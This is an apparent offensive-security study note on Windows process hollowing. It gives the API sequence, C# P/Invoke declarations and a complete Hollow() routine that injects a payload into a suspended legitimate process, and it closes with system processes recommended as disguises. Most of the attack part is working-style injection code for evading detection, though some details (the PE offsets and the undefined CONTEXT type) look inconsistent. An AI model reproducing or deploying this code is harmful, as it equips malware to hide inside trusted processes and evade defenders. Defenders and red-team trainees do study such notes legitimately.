---
tags:
  - Advanced
  - Code_Injection
  - Defense_Evasion
  - Process_Hollowing
  - Windows
---

## Process Hollowing Theory
resources: [MITRE ATT&CK - Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)

> [!info] Create legitimate process in suspended state, replace its memory with malicious code, resume execution. Process appears legitimate but runs malicious code.

### Process Hollowing Flow
> [!tip] Hollowing sequence:
> 1. Create target process in suspended state (**CREATE_SUSPENDED**)
> 2. Unmap original executable from process memory (**NtUnmapViewOfSection**)
> 3. Allocate new memory at process base address (**VirtualAllocEx**)
> 4. Write malicious PE to allocated memory (**WriteProcessMemory**)
> 5. Set thread context to point to new entry point (**SetThreadContext**)
> 6. Resume thread execution (**ResumeThread**)

### Required APIs
> - **CreateProcessA** - Create suspended process
> - **NtUnmapViewOfSection** - Unmap original image
> - **VirtualAllocEx** - Allocate memory for new image
> - **WriteProcessMemory** - Write PE headers and sections
> - **GetThreadContext** - Get current thread context
> - **SetThreadContext** - Update entry point
> - **ResumeThread** - Start execution

## Process Hollowing in C#

### API Imports
```csharp
using System;
using System.Runtime.InteropServices;

public class ProcessHollowing
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    const uint CREATE_SUSPENDED = 0x00000004;
}
```

### Complete Process Hollowing Implementation
```csharp
public static void Hollow(byte[] payload, string targetPath)
{
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

    // Create suspended process
    bool res = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

    // Parse PE headers from payload
    int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
    int entryPointRva = BitConverter.ToInt32(payload, e_lfanew + 0x28);
    int imageBase = BitConverter.ToInt32(payload, e_lfanew + 0x34);

    // Get thread context to find PEB
    CONTEXT ctx = new CONTEXT();
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, ref ctx);

    // Read PEB to get current image base
    byte[] pebBytes = new byte[8];
    ReadProcessMemory(pi.hProcess, (IntPtr)(ctx.Rdx + 0x10), pebBytes, 8, out _);
    long currentImageBase = BitConverter.ToInt64(pebBytes, 0);

    // Unmap original image
    NtUnmapViewOfSection(pi.hProcess, (IntPtr)currentImageBase);

    // Allocate memory at desired base
    IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)payload.Length, 0x3000, 0x40);

    // Write payload
    WriteProcessMemory(pi.hProcess, newBase, payload, payload.Length, out _);

    // Update PEB with new image base
    WriteProcessMemory(pi.hProcess, (IntPtr)(ctx.Rdx + 0x10), BitConverter.GetBytes((long)newBase), 8, out _);

    // Update entry point in thread context
    ctx.Rcx = (ulong)((long)newBase + entryPointRva);
    SetThreadContext(pi.hThread, ref ctx);

    // Resume execution
    ResumeThread(pi.hThread);
}
```

### Common Target Processes
> [!tip] Good target processes:
> - **svchost.exe** - Common system process, many instances normal
> - **RuntimeBroker.exe** - Windows 10 common process
> - **dllhost.exe** - COM surrogate process
